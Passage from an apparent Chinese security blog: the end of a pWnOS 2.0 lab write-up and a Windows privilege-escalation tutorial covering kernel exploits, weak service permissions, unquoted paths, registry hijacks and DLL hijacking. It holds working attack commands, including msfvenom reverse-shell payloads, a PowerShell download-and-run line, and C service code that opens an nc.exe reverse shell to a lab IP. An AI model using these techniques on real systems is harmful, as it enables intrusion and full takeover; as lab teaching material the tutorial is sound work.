<h3 id="方法2-searchsploit"><a href="#方法2-searchsploit" class="headerlink" title="方法2 searchsploit"></a>方法2 searchsploit</h3><p><img src="/images/pWnOS2.0/10.png" alt="10"></p>
<h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unix&#x2F;webapp&#x2F;sphpblog_file_upload</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/11.png" alt="11"></p>
<p>开启verbose，这里没有反弹shell，但是创建了凭据</p>
<h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>1191脚本也可以创建凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl 1191.pl -h http:&#x2F;&#x2F;192.168.1.202&#x2F;blog -e 3 -U evil -P evil</span><br></pre></td></tr></table></figure>



<p>这样我们就可以成功登录，之后找到上传图片处<br>直接上传php的shell，不需要任何绕过，提示上传成功</p>
<p>现在需要去找shell，可以用nikto扫描一下这个CMS</p>
<p><img src="/images/pWnOS2.0/12.png" alt="12"></p>
<p>发现了images目录，shell就在这里</p>
<p><img src="/images/pWnOS2.0/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="方法1内核提权"><a href="#方法1内核提权" class="headerlink" title="方法1内核提权"></a>方法1内核提权</h3><p>Ubuntu 11.04</p>
<p><img src="/images/pWnOS2.0/14.png" alt="14"></p>
<p>25444.c  介绍写的是centos，这里ubuntu也能用</p>
<p><img src="/images/pWnOS2.0/15.png" alt="15"></p>
<p>注意下文档提示的编译参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -O2 25444.c</span><br></pre></td></tr></table></figure>

<p><img src="/images/pWnOS2.0/16.png" alt="16"></p>
<h3 id="方法2密码复用"><a href="#方法2密码复用" class="headerlink" title="方法2密码复用"></a>方法2密码复用</h3><p>这里有坑，容易错过</p>
<p>在/var/www和/var下都有mysql连接文件，其中都有root的连接密码</p>
<p>两个都尝试的话，就可以发现root的密码为root@ISIntS</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows Privilege Escalation</title>
    <url>/2020/08/31/Windows-Privilege-Escalation/</url>
    <content><![CDATA[<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="普通账户"><a href="#普通账户" class="headerlink" title="普通账户"></a>普通账户</h3><p>通常使用<strong>User accounts</strong>登录windows机器<br>windows默认中有一个本地<strong>Administrator</strong>账号<br>还有几个可能存在的默认账户(比如<strong>Guest</strong>)</p>
<h3 id="服务账户"><a href="#服务账户" class="headerlink" title="服务账户"></a>服务账户</h3><p><strong>service accounts</strong>用来启动服务，不用使用它登录windows<br>其中<strong>SYSTEM</strong>账户是一个默认的服务账户，它具有最高权限<br>其他默认服务账户包括NETWORK SERVICE和LOCAL SERVICE</p>
<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>用户账户可以属于不同的组<br><strong>Groups</strong>可以方便的管理权限，如常见的组:Administrators,Users<br>还有一种组称为<strong>Pseudo-groups</strong>(比如Authenticated Users)，会根据其作用，动态调整组内的成员</p>
<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>这里的资源指:目录或文件，注册表，服务<br>用户对于它们的权限基于<strong>access control list(ACL)</strong><br>ACL由<strong>aceess control entries(ACEs)组成</strong><br>ACE规定了重要用户(user和group)和其他用户的权限</p>
<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>Windows虚拟机:<a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></p>
<table>
<thead>
<tr>
<th>Windows ip</th>
<th>Kali ip</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.110.9</td>
<td>192.168.110.3</td>
</tr>
</tbody></table>
<p>测试的环境下，我们会预先获得一个windows user shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure>

<p>或者某些提权，会使用RDP在GUI下进行提权</p>
<p>补充:某些情况下，reverse_shell不一定能稳定连接，我们可以进行migrate这样的方式，或者在高权限下执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec CMD&#x3D;&#39;net user administrator password123!&#39; -f exe -o test.exe</span><br></pre></td></tr></table></figure>

<h2 id="工具选择"><a href="#工具选择" class="headerlink" title="工具选择"></a>工具选择</h2><p>提权中，主要是基于当前环境的枚举，所以我们会使用一些自动化枚举工具，减少时间<br>比如综合的工具:winpeas,seatbelt,powerup,sharpup<br>其中主要会使用winpeas，因为winpeas带有颜色的重点标注非常友好</p>
<p>另外，还会使用AccessChk，这是一个古老但仍然使用的工具，它可以检查用户或组对文件，目录，服务和注册表的访问权限<br>这里不会使用最新版本，最新版会出现一个GUI弹窗。我们将使用老版，执行时会带有参数/accepteula去同意EULA</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>内核是任何操作系统的核心，可以把它想象成介于软件应用与电脑硬件的中间层，它具有对于操作系统的完全控制权，因此如果利用内核漏洞进行攻击，最后可以获得SYSTEM权限</p>
<h3 id="发现与利用"><a href="#发现与利用" class="headerlink" title="发现与利用"></a>发现与利用</h3><p>通常我们会通过一个程序来发现和利用内核漏洞，整个流程如下</p>
<ol>
<li>通过如<code>systeminfo</code>这样的命令来枚举windows的具体版本以及补丁安装情况</li>
<li>针对这些信息寻找漏洞利用程序(ExploitDB,Google,Github)</li>
<li>编译并执行</li>
</ol>
<p>但需注意，内核提权通常不是稳定的，它可能会直接造成系统的崩溃，所以根据经验，这应该是提权的最后手段</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>metasploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use multi&#x2F;recon&#x2F;local_exploit_suggester</span><br><span class="line">use windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure>

<p>sherlock</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;192.168.110.3&#x2F;winpriv&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>

<p>Windows-Exploit-Suggester(需要将systeminfo复制到一个文件里)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python windows-exploit-suggester.py --update</span><br><span class="line">python windows-exploit-suggester.py -d 2020-09-11-mssb.xls -i test.txt</span><br></pre></td></tr></table></figure>

<p>wes.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python wes.py systeminfo.txt -i &#39;Elevation of Privilege&#39; --exploits-only | less</span><br></pre></td></tr></table></figure>

<p>watson(依赖.Net,所以要先枚举对方的.Net版本:C:\windows\microsoft.net\framework)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\watson</span><br></pre></td></tr></table></figure>

<p>accesschk<br>简单来说</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">quv	这三个选项都是优化查询的</span><br><span class="line">w  	可写</span><br><span class="line">c 	服务</span><br><span class="line">k   注册表</span><br><span class="line">d 	目录</span><br></pre></td></tr></table></figure>

<h2 id="Services-Exploits"><a href="#Services-Exploits" class="headerlink" title="Services Exploits"></a>Services Exploits</h2><p>服务是运行在后台的常规任务，它可以接受用户输入。如果服务以系统权限运行并且配置错误，它会导致能够SYSTEM权限执行任意命令</p>
<p>这里容易出现shell不稳定的情况，因为当一个进程在windows操作系统种启动后，必须与服务控制管理器进行通信，如果没有进行通信，服务管理控制器会认为出现了错误，进而终止这个程序，所以需要程序迁移(migrate)</p>
<h3 id="手动枚举服务"><a href="#手动枚举服务" class="headerlink" title="手动枚举服务"></a>手动枚举服务</h3><p>获取服务名称</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get displayname,name,pathname</span><br></pre></td></tr></table></figure>

<p>查询服务配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe qc &lt;name&gt;</span><br></pre></td></tr></table></figure>

<p>查询服务当前状态</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe query &lt;name&gt;</span><br></pre></td></tr></table></figure>

<p>修改服务配置(注意这里=必须紧跟option)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc.exe config &lt;name&gt; &lt;option&gt;&#x3D; &lt;value&gt;</span><br></pre></td></tr></table></figure>

<p>启动/停止服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start&#x2F;stop &lt;name&gt;</span><br></pre></td></tr></table></figure>

<p>*补充2个通过注册表枚举的技巧，可以用来bypass(如AppLocker)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-Location &#39;HKLM:\SYSTEM\CurrentControlSet\Services\&#39;</span><br><span class="line">Get-ChildItem</span><br><span class="line">注意Displayname字段</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</span><br></pre></td></tr></table></figure>

<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>利用服务提权的方式有很多，常见的有5种</p>
<ol>
<li>Insecure Service Properties</li>
<li>Unquoted Service Path</li>
<li>Weak Registry Permissions</li>
<li>Insecure Service Executables</li>
<li>DLL Hijacking</li>
</ol>
<h4 id="Insecure-Service-Properties"><a href="#Insecure-Service-Properties" class="headerlink" title="Insecure Service Properties"></a>Insecure Service Properties</h4><p>每个服务都会通过ACL来规定用户对它的权限<br>有些是无害的，比如(SERVICE_QUERY_CONFIG，SERVICE_QUERY_STATUS)<br>有些可能有用，比如(SERVICE_STOP，SERVICE_START)<br>有些是危险的，比如(SERVICE_CHANGE_CONFIG,SERVICE_CHANGE_CONFIG)</p>
<p>如果我们有权限可以修改运行在SYSTEM权限下服务的配置信息，就去修改其执行的二进制文件的路径<br><strong>注意</strong>：如果你可以修改一个服务的配置，但是不能启动或停止该服务，你可能不能利用它来进行提权，对于自动启动的服务，我们应该去检查SeShutdownPrivilege，如果可以重启，也能可以得到权限提升</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shutdown &#x2F;r &#x2F;t 0</span><br></pre></td></tr></table></figure>

<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p>另外accesschk.exe也可以枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwcqv user *</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>关注有漏洞的服务</li>
</ol>
<p><img src="/images/windows-privilege-escalation/1.png" alt="1"></p>
<p><img src="/images/windows-privilege-escalation/2.png" alt="2"></p>
<ol start="3">
<li>accesschk进一步检查权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwcqv user daclsvc</span><br></pre></td></tr></table></figure>



<p><img src="/images/windows-privilege-escalation/3.png" alt="3"></p>
<p>发现有我们提权所需的权限</p>
<ol start="4">
<li>确认服务的配置信息</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc daclsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/4.png" alt="4"></p>
<p>从中重点关注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">START_TYPE         : 3   DEMAND_START											&#x2F;&#x2F;可以手动启动</span><br><span class="line">BINARY_PATH_NAME   : &quot;C:\Program Files\DACL Service\daclservice.exe&quot;			&#x2F;&#x2F;文件执行路径</span><br><span class="line">DEPENDENCIES       : 															&#x2F;&#x2F;程序执行没有依赖</span><br><span class="line">SERVICE_START_NAME : LocalSystem												&#x2F;&#x2F;服务确实以SYSTEM来运行</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>检查当前运行状态</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc query daclsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/5.png" alt="5"></p>
<p>这里为STOPPED，表示我们修改完准备利用的配置后，直接启动服务即可</p>
<ol start="6">
<li>重新设置</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config daclsvc binpath&#x3D; &quot;\&quot;C:\PrivEsc\reverse.exe\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>最简单的提权方式，就是修改binpath为我们准备好的reverse_shell</p>
<p>或者你之前没有上传shell文件，可以直接执行powershell命令来反弹(powershell的base64编码可以避免一些单双引号的问题)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc config daclsvc binpath&#x3D; &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSAC....&quot;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>设置好监听后，启动该服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start daclsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/6.png" alt="6"></p>
<h4 id="Unquoted-Service-Path"><a href="#Unquoted-Service-Path" class="headerlink" title="Unquoted Service Path"></a>Unquoted Service Path</h4><p>windows的可执行程序可以在不需要扩展名的情况下运行(如whoami.exe只需要whoami即可运行)<br>一些可执行文件会接受参数，用空格符分隔，如program.exe agr1 agr2….<br>当使用不带引号且包含空格绝对路径时，这会导致歧义</p>
<p>比如这样的路径<code>C:\Program Files\Some Dir\SomeProgram.exe</code>，正常来看，它执行的是SomeProgram.exe<br>但对于windows来说，<code>C:\Program</code>可以是一个可执行程序，它携带两个参数<code>Files\Some</code>和<code>Dir\ SomeProgram.exe</code><br>windows会依次检查这种潜在可能性来进行排除。如果我们可以写入一个可执行文件在windows检查原本可执行文件之前，可以诱使服务去执行它们</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p>在<code>Interesting Services -non Microsoft</code>条目里发现<code>No quotes and Space detected</code></p>
<p><img src="/images/windows-privilege-escalation/7.png" alt="7"></p>
<p>手动枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr &#x2F;i &#x2F;V &quot;C:\Windows&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">powershell</span><br><span class="line">Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where &#123;$_.StartMode -ne &quot;Disabled&quot; -and $_.StartName -eq &quot;LocalSystem&quot; -and $_.PathName -notmatch &quot;&#96;&quot;&quot; -and $_.PathName -notmatch &quot;C:\\Windows&quot;&#125; | Format-List</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>检查服务的配置</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc qc unquotedsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/8.png" alt="8"></p>
<p>从路径，我们得到利用路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</span><br><span class="line"></span><br><span class="line">可利用</span><br><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Unquoted.exe</span><br><span class="line">C:\Program Files\Unquoted Path Service\Common.exe</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>检查一下服务的权限，重点看我们是否有启动/停止权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user unquotedsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/9.png" alt="9"></p>
<ol start="4">
<li>依次检查可利用路径是否可以写入文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq C:\</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq &quot;C:\Program Files\&quot;</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -uwdq &quot;C:\Program Files\Unquoted Path Service\&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/10.png" alt="10"></p>
<p>看来在路径<code>C:\Program Files\Unquoted Path Service\</code>下<code>RW BUILTIN\Users</code>组的用户拥有W权限，这也是我们用户所在的组</p>
<ol start="5">
<li>复制我们提前准备好的reverse_shell的exe文件到利用目录，并改名</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\PrivEsc\reverse.exe &quot;C:\Program Files\Unquoted Path Service\Common.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/11.png" alt="11"></p>
<ol start="6">
<li>开启端口监听，并启动服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start unquotedsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/12.png" alt="12"></p>
<p>metasploit模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;unquoted_service_path</span><br></pre></td></tr></table></figure>

<h4 id="Weak-Registry-Permissions"><a href="#Weak-Registry-Permissions" class="headerlink" title="Weak Registry Permissions"></a>Weak Registry Permissions</h4><p>windows的注册表存储每个服务的条目。注册表项也会使用ACL管理权限，如果ACL配置错误，即使不能直接修改服务，也可以修改服务的配置</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/13.png" alt="13"></p>
<p>发现了当前用户可以修改服务regsvc的注册表条目</p>
<p>手动枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">accesschk.exe -kvusw hklm\System\CurrentControlSet\services</span><br><span class="line">(寻找:</span><br><span class="line">  RW NT AUTHORITY\INTERACTIVE</span><br><span class="line">        KEY_ALL_ACCESS</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">powershell</span><br><span class="line">Get-Acl -Path hklm:\System\CurrentControlset\services\* | select Path,AccessToString |Format-List</span><br><span class="line">(寻找:NT AUTHORITY\INTERACTIVE Allow  FullControl)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用powershell或accesschk进一步检查我们对注册表的权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\PrivEsc&gt;powershell -exec bypass</span><br><span class="line">PS C:\PrivEsc&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc |Format-List</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/14.png" alt="14"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/15.png" alt="15"></p>
<p>注意<code>NT AUTHORITY\INTERACTIVE</code>组具有RW权限，这个组的成员包含所有能够登录到系统的成员，其中就有我们当前的用户</p>
<ol start="3">
<li>检查我们是否能够启动/停止服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user regsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/16.png" alt="16"></p>
<ol start="4">
<li>检查当前注册表的值</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/17.png" alt="17"></p>
<p>从中我们知道了可执行程序的绝对路径和该服务以SYSTEM运行</p>
<ol start="5">
<li>接下来就和修改服务启动路径的方法一致，替换为我们的reverse_shell，不同点使这次我们通过修改注册表的值来完成</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc &#x2F;v ImagePath &#x2F;t REG_EXPAND_SZ &#x2F;d C:\PrivEsc\reverse.exe &#x2F;f</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/18.png" alt="18"></p>
<p>除了反弹shell.exe，也可以编译生成自己想要的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;x86_64-w64-mingw32-gcc windows_service.c -o evil.exe</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#define SLEEP_TIME 5000</span><br><span class="line"></span><br><span class="line">SERVICE_STATUS ServiceStatus; </span><br><span class="line">SERVICE_STATUS_HANDLE hStatus; </span><br><span class="line"> </span><br><span class="line">void ServiceMain(int argc, char** argv); </span><br><span class="line">void ControlHandler(DWORD request); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;add the payload here</span><br><span class="line">int Run() </span><br><span class="line">&#123; </span><br><span class="line">    system(&quot;C:\\Users\\user\\Desktop\\nc.exe 192.168.110.2 5555 -e cmd&quot;);</span><br><span class="line">    return 0; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">    SERVICE_TABLE_ENTRY ServiceTable[2];</span><br><span class="line">    ServiceTable[0].lpServiceName &#x3D; &quot;MyService&quot;;</span><br><span class="line">    ServiceTable[0].lpServiceProc &#x3D; (LPSERVICE_MAIN_FUNCTION)ServiceMain;</span><br><span class="line"></span><br><span class="line">    ServiceTable[1].lpServiceName &#x3D; NULL;</span><br><span class="line">    ServiceTable[1].lpServiceProc &#x3D; NULL;</span><br><span class="line"> </span><br><span class="line">    StartServiceCtrlDispatcher(ServiceTable);  </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ServiceMain(int argc, char** argv) </span><br><span class="line">&#123; </span><br><span class="line">    ServiceStatus.dwServiceType        &#x3D; SERVICE_WIN32; </span><br><span class="line">    ServiceStatus.dwCurrentState       &#x3D; SERVICE_START_PENDING; </span><br><span class="line">    ServiceStatus.dwControlsAccepted   &#x3D; SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;</span><br><span class="line">    ServiceStatus.dwWin32ExitCode      &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwServiceSpecificExitCode &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwCheckPoint         &#x3D; 0; </span><br><span class="line">    ServiceStatus.dwWaitHint           &#x3D; 0; </span><br><span class="line"> </span><br><span class="line">    hStatus &#x3D; RegisterServiceCtrlHandler(&quot;MyService&quot;, (LPHANDLER_FUNCTION)ControlHandler); </span><br><span class="line">    Run(); </span><br><span class="line">    </span><br><span class="line">    ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING; </span><br><span class="line">    SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line"> </span><br><span class="line">    while (ServiceStatus.dwCurrentState &#x3D;&#x3D; SERVICE_RUNNING)</span><br><span class="line">    &#123;</span><br><span class="line">		Sleep(SLEEP_TIME);</span><br><span class="line">    &#125;</span><br><span class="line">    return; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ControlHandler(DWORD request) </span><br><span class="line">&#123; </span><br><span class="line">    switch(request) </span><br><span class="line">    &#123; </span><br><span class="line">        case SERVICE_CONTROL_STOP: </span><br><span class="line">			ServiceStatus.dwWin32ExitCode &#x3D; 0; </span><br><span class="line">            ServiceStatus.dwCurrentState  &#x3D; SERVICE_STOPPED; </span><br><span class="line">            SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line">            return; </span><br><span class="line"> </span><br><span class="line">        case SERVICE_CONTROL_SHUTDOWN: </span><br><span class="line">            ServiceStatus.dwWin32ExitCode &#x3D; 0; </span><br><span class="line">            ServiceStatus.dwCurrentState  &#x3D; SERVICE_STOPPED; </span><br><span class="line">            SetServiceStatus (hStatus, &amp;ServiceStatus);</span><br><span class="line">            return; </span><br><span class="line">        </span><br><span class="line">        default:</span><br><span class="line">            break;</span><br><span class="line">    &#125; </span><br><span class="line">    SetServiceStatus (hStatus,  &amp;ServiceStatus);</span><br><span class="line">    return; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ol start="6">
<li>开启监听，启动服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start regsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/19.png" alt="19"></p>
<h4 id="Insecure-Service-Executables"><a href="#Insecure-Service-Executables" class="headerlink" title="Insecure Service Executables"></a>Insecure Service Executables</h4><p>如果用户可直接修改原始服务的可执行文件，我们可以直接用我们的reverse_shell来代替<br>这种操作具有危险性，正式渗透中应该先备份服务文件</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/20.png" alt="20"></p>
<p>在<code>Interesting Services -non Microsoft</code>条目下发现<code>File Permissions: Everyone [AllAccess]</code></p>
<p>手动枚举只能枚举服务的二进制程序路径，然后检查该文件的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic service get displayname,name,pathname</span><br><span class="line">.\accesschk.exe &#x2F;accepteula -quvw &quot;FILE_PATH&quot;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>accesschk检查文件权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -quvw &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/21.png" alt="21"></p>
<ol start="3">
<li>检查我们是否能够启动/停止服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -uvqc filepermsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/22.png" alt="22"></p>
<ol start="4">
<li>安全备份原始文件，并将reverse_shell的exe文件对其进行替换</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot; C:\Temp</span><br><span class="line">copy &#x2F;Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</span><br></pre></td></tr></table></figure>

<p>除了反弹shell，windows_service.c也可以使用</p>
<p>开启监听，启动服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net start filepermsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/23.png" alt="23"></p>
<p>metasploit模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit&#x2F;windows&#x2F;local&#x2F;service_permissions</span><br></pre></td></tr></table></figure>

<h4 id="DLL-Hijacking"><a href="#DLL-Hijacking" class="headerlink" title="DLL Hijacking"></a>DLL Hijacking</h4><p>通常服务会从DLL库中加载功能。无论DLL提供什么样的功能，都将与加载它的服务以相同的权限执行。<br>如果一个DLL使用绝对路径加载的，而且我们可以对他进行写入，那么可能可以用来进行提权</p>
<p>(补充:一种更常见的利用DLL劫持的错误配置使，系统中缺少了某个DLL库，当前用户Windows搜索DLL的PATH内的目录拥有写入权限。但这种漏洞很难被发现，而且整个发现和利用过程都需要手动进行)</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet servicesinfo</span><br></pre></td></tr></table></figure>

<p>在Interesting Services -non Microsoft条目下发现一些服务，并在PATH中发现了我们可以拥有写权限的目录<code>C:\Temp</code>，这可能会导致DLL劫持</p>
<p><img src="/images/windows-privilege-escalation/24.png" alt="24"></p>
<p><strong>附录:</strong></p>
<p>真实情况中，在受害者的机器上寻找系统环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo %PATH%</span><br></pre></td></tr></table></figure>

<p>如果这里的目录可写，回到自己搭建的环境下也要创建相同的目录</p>
<p>接着在受害者的机器上寻找当前低权限用户能够启动的服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -ucqv user *</span><br></pre></td></tr></table></figure>

<p>之后去寻找它们的二进制程序，接着复制它们到自己控制的机器上，创建服务</p>
<p>顺带一提如何配置引号路径，下面这种直接添加引号的方式是不行的</p>
